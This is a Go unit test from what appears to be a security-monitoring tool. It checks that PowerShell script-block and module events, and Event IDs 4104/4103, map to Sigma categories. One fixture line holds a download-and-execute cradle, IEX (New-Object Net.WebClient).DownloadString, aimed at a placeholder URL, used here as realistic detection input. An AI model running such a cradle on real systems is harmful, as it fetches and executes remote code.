package domain

import "testing"

func TestPowerShellAgentEventsMapToSigmaCategories(t *testing.T) {
	sb, err := NewLogEvent(map[string]interface{}{
		"event_type": "powershell",
		"data": map[string]interface{}{
			"action": "script_block", "channel": "Microsoft-Windows-PowerShell/Operational",
			"script_block_text": "IEX (New-Object Net.WebClient).DownloadString('http://x')",
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if sb.Category != EventCategoryPsScript {
		t.Fatalf("script block category = %s, want ps_script", sb.Category)
	}
	if sb.Service != "powershell" {
		t.Fatalf("service = %q, want powershell", sb.Service)
	}
	mod, _ := NewLogEvent(map[string]interface{}{"event_type": "powershell", "data": map[string]interface{}{"action": "module"}})
	if mod.Category != EventCategoryPsModule {
		t.Fatalf("module category = %s, want ps_module", mod.Category)
	}
	if InferCategoryFromEventID(4104) != EventCategoryPsScript || InferCategoryFromEventID(4103) != EventCategoryPsModule {
		t.Fatal("Event Log 4104/4103 must map to ps_script/ps_module")
	}
}
